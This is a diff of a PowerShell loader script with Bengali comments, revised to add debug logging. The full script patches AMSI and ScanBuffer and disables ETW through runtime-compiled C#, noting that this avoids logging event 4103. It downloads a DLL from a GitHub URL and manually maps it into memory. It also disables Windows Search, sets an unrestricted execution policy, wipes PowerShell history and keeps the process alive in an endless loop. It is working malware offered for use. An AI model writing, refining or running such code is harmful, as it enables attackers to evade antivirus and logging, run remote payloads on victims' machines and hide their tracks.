@@ -1,7 +1,25 @@
 # ============================================================
-#  ★★★ ১. AMSI + ETW বাইপাস (সর্বপ্রথম) ★★★
+#  ★★★ ০. Error দেখানোর জন্য প্রেফারেন্স সেট ★★★
+# ============================================================
+Set-StrictMode -Version Latest
+$VerbosePreference = 'SilentlyContinue'
+$DebugPreference = 'SilentlyContinue'
+$InformationPreference = 'SilentlyContinue'
+$WarningPreference = 'Continue'          # Warning দেখাবে
+$ErrorActionPreference = 'Continue'      # Error দেখাবে এবং থামবে না
+$ConfirmPreference = 'None'
+$WhatIfPreference = $false
+$PSModuleAutoLoadingPreference = 'None'
+$MaximumHistoryCount = 0
+$Error.Clear()
+
+Write-Host "[+] Script Started..." -ForegroundColor Cyan
+
+# ============================================================
+#  ★★★ ১. AMSI বাইপাস ★★★
 # ============================================================
 try {
+    Write-Host "[*] Bypassing AMSI..." -ForegroundColor Cyan
     $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     $a.GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
@@ -10,12 +28,17 @@ try {
         $ptr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($scanBuffer)
         [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x31C0C3)
     }
-} catch {}
+    Write-Host "[+] AMSI Bypass Done." -ForegroundColor Green
+} catch {
+    Write-Host "[-] AMSI Bypass Failed: $_" -ForegroundColor Red
+}
 
 # ============================================================
-#  ★★★ ২. C# লোকাল পিই লোডার + ETW বাইপাস (CSharpCodeProvider) ★★★
-#  (এতে Add-Type ব্যবহার করা হয়নি, ফলে Event ID 4103 তৈরি হয় না)
+#  ★★★ ২. C# কোড কম্পাইল (ETW + ম্যানুয়াল লোডার) ★★★
+#  (এখানে Add-Type নেই, তাই Event 4103 তৈরি হবে না)
 # ============================================================
+Write-Host "[*] Compiling C# Loader (without Add-Type)..." -ForegroundColor Cyan
+
 $code = @'
 using System;
 using System.Runtime.InteropServices;
@@ -33,7 +56,7 @@ public static class Etw {
 
 public static class NativeLoader {
     [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
-    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);
+    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualFree(IntPtr b, UIntPtr s, uint t);
     [DllImport("kernel32.dll", SetLastError = true)] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
     [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, string n);
     [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr h, IntPtr o);
@@ -77,7 +100,7 @@ public static class NativeLoader {
 }
 '@
 
-# C# কম্পাইল (Add-Type ব্যবহার না করে CSharpCodeProvider)
+# C# কম্পাইল (Add-Type বাদ)
 [System.Reflection.Assembly]::LoadWithPartialName("System.CodeDom") | Out-Null
 $compiler = [System.CodeDom.Compiler.CodeDomProvider]::CreateProvider("CSharp")
 $params = New-Object System.CodeDom.Compiler.CompilerParameters
@@ -86,31 +109,57 @@ $params.GenerateExecutable = $false
 $params.IncludeDebugInformation = $false
 $params.CompilerOptions = "/target:library /optimize+"
 $result = $compiler.CompileAssemblyFromSource($params, $code)
+
 if ($result.Errors.Count -gt 0) {
-    foreach ($err in $result.Errors) { Write-Error $err }
+    Write-Host "[-] C# Compilation Failed! Errors:" -ForegroundColor Red
+    foreach ($err in $result.Errors) { Write-Host $err -ForegroundColor Red }
+    Read-Host "`nPress Enter to exit"
     exit
 }
 $assembly = $result.CompiledAssembly
+Write-Host "[+] C# Compilation Successful." -ForegroundColor Green
 
-# ETW বাইপাস কল
-$etwType = $assembly.GetType("Etw")
-$etwType.GetMethod("Off").Invoke($null, @())
+# ETW বন্ধ করা
+$assembly.GetType("Etw").GetMethod("Off").Invoke($null, @())
+Write-Host "[+] ETW Bypass Done." -ForegroundColor Green
 
-# NativeLoader মেথড প্রস্তুত
+# NativeLoader মেথড নেওয়া
 $loaderType = $assembly.GetType("NativeLoader")
 $mapMethod = $loaderType.GetMethod("Map")
 
 # ============================================================
-#  ★★★ ৩. DLL ডাউনলোড (মেমোরিতে) ও ম্যানুয়াল ম্যাপ ★★★
+#  ★★★ ৩. DLL ডাউনলোড ও ম্যানুয়াল ম্যাপ (এখানে Error দেখাবে) ★★★
 # ============================================================
+Write-Host "[*] Downloading DLL from GitHub..." -ForegroundColor Cyan
 try {
-    $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
-    $mapMethod.Invoke($null, @($bytes, $true))
-} catch {}
+    $url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
+    $webClient = New-Object System.Net.WebClient
+    $bytes = $webClient.DownloadData($url)
+    Write-Host "[*] Downloaded $($bytes.Length) bytes." -ForegroundColor Cyan
+
+    # PE ফাইল কিনা চেক
+    if ($bytes.Length -lt 64 -or [BitConverter]::ToUInt16($bytes, 0) -ne 0x5A4D) {
+        Write-Host "[-] Downloaded file is not a valid PE (MZ header missing)." -ForegroundColor Red
+    } else {
+        Write-Host "[*] Mapping DLL into memory (Manual Mapping)..." -ForegroundColor Cyan
+        $resultMap = $mapMethod.Invoke($null, @($bytes, $true))
+        if ($resultMap -ne $null) {
+            Write-Host "[+] DLL Mapped Successfully! ImageBase: $($resultMap.ImageBase)" -ForegroundColor Green
+        } else {
+            Write-Host "[-] Map method returned null." -ForegroundColor Red
+        }
+    }
+} catch {
+    Write-Host "[-] Exception occurred during Download or Map:" -ForegroundColor Red
+    Write-Host $_.Exception.ToString() -ForegroundColor Red
+    Write-Host "[-] Inner Exception: $($_.Exception.InnerException)" -ForegroundColor Red
+}
 
 # ============================================================
-#  ★★★ ৪. মূল main.ps1-এর কনফিগারেশন অপারেশন ★★★
+#  ★★★ ৪. মূল main.ps1-এর কনফিগারেশন (যেমন ছিল, ঠিক তেমনই) ★★★
 # ============================================================
+Write-Host "[*] Applying System Configurations (Registry, Services)..." -ForegroundColor Cyan
+
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
 
 Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
@@ -127,8 +176,9 @@ Invoke-Expression $regCommand2 | Out-Null
 Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
 
 # ============================================================
-#  ★★★ ৫. ট্রেস ক্লিয়ার (সম্পূর্ণ নীরব) ★★★
+#  ★★★ ৫. ট্রেস ক্লিয়ার ★★★
 # ============================================================
+Write-Host "[*] Clearing Traces..." -ForegroundColor Cyan
 Clear-History
 $hp = (Get-PSReadlineOption).HistorySavePath
 if (Test-Path $hp) { Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue }
@@ -150,7 +200,7 @@ Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
     }
 }
 
-# পুনরায় ইতিহাস ফাইল তৈরি (যদি না থাকে)
+# ইতিহাস ফাইল পুনরায় তৈরি
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
 if (-not (Test-Path $historyPath)) {
     New-Item -Path $historyPath -ItemType File -Force | Out-Null
@@ -158,7 +208,11 @@ if (-not (Test-Path $historyPath)) {
     Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
 }
 
+Write-Host "[+] All Configurations Applied." -ForegroundColor Green
+
 # ============================================================
-#  ★★★ ৬. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে) ★★★
+#  ★★★ ৬. প্রক্রিয়া চালু রাখতে অসীম লুপ (এখন উইন্ডো খোলা থাকবে) ★★★
 # ============================================================
+Write-Host "[*] Entering infinite loop to keep process alive..." -ForegroundColor Cyan
+Write-Host "You can close this window manually to stop." -ForegroundColor Yellow
 while ($true) { Start-Sleep -Seconds 86400 }
